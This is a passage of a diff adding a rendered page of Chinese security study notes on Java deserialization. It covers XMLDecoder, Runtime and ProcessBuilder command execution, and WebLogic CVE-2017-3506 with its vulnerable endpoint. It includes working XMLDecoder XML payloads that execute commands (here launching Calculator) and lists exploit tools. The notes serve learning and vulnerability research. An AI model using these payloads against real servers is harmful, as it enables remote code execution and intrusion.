+<a id="__codelineno-1-22" name="__codelineno-1-22"></a>  <span class="p">}</span>
+<a id="__codelineno-1-23" name="__codelineno-1-23"></a><span class="p">}</span>
+</code></pre></div>
+<h4 id="decoder_mod">decoder_mod</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="kn">import</span> <span class="nn">java.beans.XMLDecoder</span><span class="p">;</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="kn">import</span> <span class="nn">java.io.StringBufferInputStream</span><span class="p">;</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4"></a>
+<a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="kn">import</span> <span class="nn">javax.sql.rowset.spi.XmlReader</span><span class="p">;</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6"></a>
+<a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="kd">public</span> <span class="kd">class</span> <span class="nc">decoder</span> <span class="p">{</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8"></a>
+<a id="__codelineno-2-9" name="__codelineno-2-9"></a>  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">InterruptedException</span> <span class="p">{</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10"></a>    <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="s">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11"></a>        <span class="o">+</span> <span class="s">&quot;&lt;java version=\&quot;11.0.13\&quot; class=\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;Object class=\&quot;java.util.HashMap\&quot;&gt;\n&quot;</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12"></a>        <span class="o">+</span> <span class="s">&quot;&lt;array class=\&quot;java.lang.String\&quot; length=\&quot;1\&quot;&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;void index=\&quot;0\&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;\n&quot;</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13"></a>        <span class="o">+</span> <span class="s">&quot;&lt;/array&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;void method=\&quot;start\&quot;&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/void&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/object&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/java&gt;&quot;</span><span class="p">;</span>
+<a id="__codelineno-2-14" name="__codelineno-2-14"></a>    <span class="n">StringBufferInputStream</span> <span class="n">stringBufferInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBufferInputStream</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+<a id="__codelineno-2-15" name="__codelineno-2-15"></a>    <span class="n">XMLDecoder</span> <span class="n">xmlDecoder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XMLDecoder</span><span class="p">(</span><span class="n">stringBufferInputStream</span><span class="p">);</span>
+<a id="__codelineno-2-16" name="__codelineno-2-16"></a>    <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">xmlDecoder</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+<a id="__codelineno-2-17" name="__codelineno-2-17"></a>    <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">);</span>
+<a id="__codelineno-2-18" name="__codelineno-2-18"></a>
+<a id="__codelineno-2-19" name="__codelineno-2-19"></a>  <span class="p">}</span>
+<a id="__codelineno-2-20" name="__codelineno-2-20"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="_3">反序列化原理</h3>
+<p>Java应用对用户输入没有任何过滤, 即不可信数据做了反序列化处理, 攻击者可以通过构造恶意输入, 让反序列化产生非预期的对象, 就有可能造成任意代码执行</p>
+<h3 id="_4">反序列化漏洞挖掘</h3>
+<ul>
+<li>反序列化漏洞多使用白盒审计方法来挖掘, 黑盒挖掘难度过高</li>
+<li>在代码中搜索某些高危函数, 如 XMLDecoder.readObject, Yaml.load, XStream.fromXML 等, 确定了反序列化输入点后, 再观察应用的 ClassPath 中是否包含 ApacheCommons Collections 等危险库</li>
+<li>若包含危险库, 则使用 <strong>ysoserial</strong> 等开源工具进行攻击复现</li>
+<li>若不包含危险库, 则查看一些涉及命令, 代码执行的代码区域, 防止因代码不严谨, 导致反序列化漏洞的产生</li>
+<li>查看高危函数的输入点是否可控</li>
+</ul>
+<h2 id="java">Java系统命令执行</h2>
+<ul>
+<li>Java中的Runtime类和ProcessBuilder类的作用</li>
+<li>使用Java代码编写执行系统命令的java文件</li>
+</ul>
+<h3 id="_5">调用系统计算器</h3>
+<h4 id="javalangruntime">java.lang.Runtime</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="c1">//常规写法</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="n">runtime</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;open /Applications/Calculator.app&quot;</span><span class="p">);</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4"></a>
+<a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="c1">//Java自带的类</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="n">runtime</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;open -a Calculator&quot;</span><span class="p">});</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8"></a>
+<a id="__codelineno-3-9" name="__codelineno-3-9"></a><span class="c1">//带回显的命令行</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="n">Process</span> <span class="n">start</span> <span class="o">=</span> <span class="n">runtime</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;ip a&quot;</span><span class="p">);</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="n">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="n">start</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13"></a><span class="kt">byte</span><span class="o">[]</span> <span class="n">res</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1024</span><span class="o">]</span><span class="p">;</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14"></a><span class="n">inputStream</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="n">res</span><span class="p">);</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15"></a><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">new</span> <span class="n">Sting</span><span class="p">(</span><span class="n">res</span><span class="p">));</span>
+</code></pre></div>
+<h4 id="javalangprocessbuilder">java.lang.ProcessBuilder</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="c1">//Java 极简写法</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;open -a Calculator&quot;</span><span class="p">).</span><span class="na">start</span><span class="p">();</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="c1">//Java 自带的类</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">ProcessBuilder</span><span class="p">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;open -a Calculator&quot;</span><span class="p">}).</span><span class="na">start</span><span class="p">();</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="c1">//标准写法</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="n">ProcessBuilder</span> <span class="n">processBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;open -a Calculator&quot;</span><span class="p">);</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="n">Process</span> <span class="n">start</span> <span class="o">=</span> <span class="n">processBuilder</span><span class="p">.</span><span class="na">start</span><span class="p">();</span>
+</code></pre></div>
+<h4 id="windows">Windows</h4>
+<ul>
+<li><code>calc</code>    调用计算器</li>
+<li><code>cmd /c calc</code>    通过CMD命令调用calc, 执行完成后关闭命令行窗口</li>
+<li><code>cmd /k calc</code>    通过CMD命令调用calc, 执行完后不不关闭命令行窗口</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2"></a>
+<a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="kd">public</span> <span class="kd">class</span> <span class="nc">runtime</span> <span class="p">{</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4"></a>  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="p">{</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5"></a>    <span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6"></a>    <span class="n">runtime</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;calc&quot;</span><span class="p">);</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7"></a>    <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">runtime</span><span class="p">);</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8"></a>  <span class="p">}</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="p">}</span>
+</code></pre></div>
+<h4 id="macos">MacOS</h4>
+<p>二进制程序的执行位置</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>/Applications/Calculator.app/Contents/MacOS/Calculator
+<a id="__codelineno-6-2" name="__codelineno-6-2"></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3"></a>open /Applications/Calculator.app
+</code></pre></div>
+<p>不同版本位置可能不同</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>/System/Applications/Calculator.app/Contents/MacOS/Calculator
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a>
+<a id="__codelineno-7-3" name="__codelineno-7-3"></a>open /System/Applications/Calculator.app
+</code></pre></div>
+<p>使用 bash 调用 open -a Calculator 命令</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>bash -c open -a Calculator
+<a id="__codelineno-8-2" name="__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3"></a>/bin/bash -c open -a Calculator
+</code></pre></div>
+<h2 id="payload">反序列化Payload构造</h2>
+<h3 id="xml-payload">XML 单参数 Payload 构造</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">ProcessBuilder</span><span class="p">(</span><span class="s">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span><span class="p">).</span><span class="na">start</span><span class="p">()</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="nt">&lt;java</span> <span class="na">version=</span><span class="s">&quot;1.8.0_261&quot;</span> <span class="na">class=</span><span class="s">&quot;java.beans.XMLDecoder&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3"></a>  <span class="nt">&lt;object</span> <span class="na">class=</span><span class="s">&quot;java.lang.ProcessBuilder&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4"></a>    <span class="nt">&lt;array</span> <span class="na">class=</span><span class="s">&quot;java.lang.String&quot;</span> <span class="na">length=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5"></a>      <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6"></a>        <span class="nt">&lt;string&gt;</span>/Applications/Calculator.app/Contents/MacOS/Calculator<span class="nt">&lt;/string&gt;</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7"></a>      <span class="nt">&lt;/void&gt;</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8"></a>    <span class="nt">&lt;/array&gt;</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9"></a>    <span class="nt">&lt;void</span> <span class="na">method=</span><span class="s">&quot;start&quot;</span><span class="nt">&gt;&lt;/void&gt;</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10"></a>  <span class="nt">&lt;/object&gt;</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11"></a><span class="nt">&lt;/java&gt;</span>
+</code></pre></div>
+<h3 id="xml-payload_1">XML 多参数 Payload 构造</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;open -a Calculator&quot;</span><span class="p">).</span><span class="na">start</span><span class="p">();</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="nt">&lt;java</span> <span class="na">version=</span><span class="s">&quot;1.8.0_261&quot;</span> <span class="na">class=</span><span class="s">&quot;java.beans.XMLDecoder&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3"></a>  <span class="nt">&lt;object</span> <span class="na">class=</span><span class="s">&quot;java.lang.ProcessBuilder&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4"></a>    <span class="nt">&lt;array</span> <span class="na">class=</span><span class="s">&quot;java.lang.String&quot;</span> <span class="na">length=</span><span class="s">&quot;3&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5"></a>      <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6"></a>        <span class="nt">&lt;string&gt;</span>/bin/bash<span class="nt">&lt;/string&gt;</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7"></a>      <span class="nt">&lt;/void&gt;</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8"></a>      <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9"></a>        <span class="nt">&lt;string&gt;</span>c<span class="nt">&lt;/string&gt;</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10"></a>      <span class="nt">&lt;/void&gt;</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11"></a>      <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;2&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-12-12" name="__codelineno-12-12"></a>        <span class="nt">&lt;string&gt;</span>open -a Calculator<span class="nt">&lt;/string&gt;</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13"></a>      <span class="nt">&lt;/void&gt;</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14"></a>    <span class="nt">&lt;/array&gt;</span>
+<a id="__codelineno-12-15" name="__codelineno-12-15"></a>    <span class="nt">&lt;void</span> <span class="na">method=</span><span class="s">&quot;start&quot;</span><span class="nt">&gt;&lt;/void&gt;</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16"></a>  <span class="nt">&lt;/object&gt;</span>
+<a id="__codelineno-12-17" name="__codelineno-12-17"></a><span class="nt">&lt;/java&gt;</span>
+</code></pre></div>
+<h2 id="weblogic">Weblogic反序列化漏洞分析</h2>
+<h3 id="cve-2017-3506">CVE-2017-3506 漏洞简介</h3>
+<p><img alt="image-20211224095543183" src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@security/web/java_deserialization/image-20211224095543183.png" /></p>
+<ul>
+<li>影响版本: Weblogic 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2</li>
+<li>漏洞位置: wls-wsat.war</li>
+<li>漏洞 URL: /wls-wsat/CoordinatorPortType (POST)</li>
+<li>漏洞本质: 构造 SOAP (XML) 格式的请求, 在解析的过程中导致 XMLDecoder 反序列化漏洞</li>
+</ul>
+<p>使用 JD-GUI 反编译 jar/root/Oracle/Middleware/wlserver_10.3/lib/weblogic.jar</p>
+<p>weblogic.wess.jaxws.workcontent.WorkContextServerTube</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="kd">public</span> <span class="n">NextAction</span> <span class="nf">processRequest</span><span class="p">(</span><span class="n">Packet</span> <span class="n">paramPacket</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2"></a>  <span class="k">this</span><span class="p">.</span><span class="na">isUseOldFormat</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3"></a>  <span class="k">if</span> <span class="p">(</span><span class="n">paramPacket</span><span class="p">.</span><span class="na">getMessage</span><span class="p">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4"></a>    <span class="n">HeaderList</span> <span class="n">headerList</span> <span class="o">=</span> <span class="n">paramPacket</span><span class="p">.</span><span class="na">getMessage</span><span class="p">().</span><span class="na">getHeaders</span><span class="p">();</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5"></a>    <span class="n">Header</span> <span class="n">header1</span> <span class="o">=</span> <span class="n">headerList</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">WorkAreaConstants</span><span class="p">.</span><span class="na">WORK_AREA_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6"></a>    <span class="k">if</span> <span class="p">(</span><span class="n">header1</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7"></a>      <span class="n">readHeaderOld</span><span class="p">(</span><span class="n">header1</span><span class="p">);</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8"></a>      <span class="k">this</span><span class="p">.</span><span class="na">isUseOldFormat</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9"></a>    <span class="p">}</span>
+<a id="__codelineno-13-10" name="__codelineno-13-10"></a>    <span class="n">Header</span> <span class="n">header2</span> <span class="o">=</span> <span class="n">headerList</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">JAX_WS_WORK_AREA_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11"></a>    <span class="k">if</span> <span class="p">(</span><span class="n">header2</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12"></a>      <span class="n">readHeader</span><span class="p">(</span><span class="n">header2</span><span class="p">);</span>
+<a id="__codelineno-13-13" name="__codelineno-13-13"></a>    <span class="p">}</span>
+<a id="__codelineno-13-14" name="__codelineno-13-14"></a>    <span class="k">return</span> <span class="kd">super</span><span class="p">.</span><span class="na">processRequest</span><span class="p">(</span><span class="n">paramPacket</span><span class="p">);</span>
+<a id="__codelineno-13-15" name="__codelineno-13-15"></a>  <span class="p">}</span>
+<a id="__codelineno-13-16" name="__codelineno-13-16"></a><span class="p">}</span>
+</code></pre></div>
+<ul>
+<li>Weblogic反序列化漏洞的基本原理</li>
+<li>使用EXP和自动化集成工具进行Weblogic反序列化漏洞的漏洞利用</li>
+<li>Weblogic反序列化漏洞的更新补丁和绕过原理</li>
+</ul>
+<h2 id="_6">反序列化实战中的利用方法</h2>
+<ul>
+<li>Weblogic CVE-2019-2725漏洞的形成原因</li>
+<li>使用EXP和自动化集成工具进行 CVE-2019-2725漏洞的利用</li>
+<li>Apache Shiro 1.2.4 反序列化漏洞的形成原因</li>
+<li>使用自动化集成工具进行Shiro反序列化漏洞的利用</li>
+<li>Jboss反序列化漏洞的形成原因</li>
+<li>使用脚本和自动化集成工具进行Jboss反序列化漏洞的漏洞利用</li>
+</ul>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="页脚">
+      
+        
+        <a href="../file_upload/" class="md-footer__link md-footer__link--prev" aria-label="上一页: 文件上传漏洞" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              文件上传漏洞
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../middleware/" class="md-footer__link md-footer__link--next" aria-label="下一页: 常见中间件及漏洞" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              常见中间件及漏洞
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.0bbba5b5.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.e1a181d9.min.js"></script>
+      
+    
+  </body>
+</html>
